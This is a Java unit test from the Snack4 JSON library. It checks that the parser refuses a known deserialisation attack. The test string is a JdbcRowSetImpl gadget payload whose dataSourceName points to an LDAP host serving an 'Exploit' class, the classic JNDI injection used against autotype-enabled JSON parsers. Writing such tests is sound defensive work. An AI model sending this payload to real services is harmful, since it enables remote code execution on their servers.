package features.snack4.v3_composite;

import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;
import org.noear.snack4.core.Feature;
import org.noear.snack4.SnackException;
import org.noear.snack4.ONode;

/**
 * @author noear 2021/5/20 created
 */
public class JdbcRowSetImplTest {
    String json = "{@type:'com.sun.rowset.JdbcRowSetImpl',dataSourceName:'ldap://192.168.142.44:1389/fastjson/Exploit',autoCommit:true}";
    @Test
    public void test(){
        //
        //不会根据 dataSourceName、autoCommit 生成 Connection 对象，并注入构造函数
        //

        Assertions.assertThrows(SnackException.class, () -> {
            ONode.ofJson(json, Feature.Read_AutoType).toBean();
        });

//        Object tmp = ONode.ofJson(json).toBean();
//
//        assert tmp != null;
//        assert tmp.getClass().getName().equals("com.sun.rowset.JdbcRowSetImpl");
    }
}
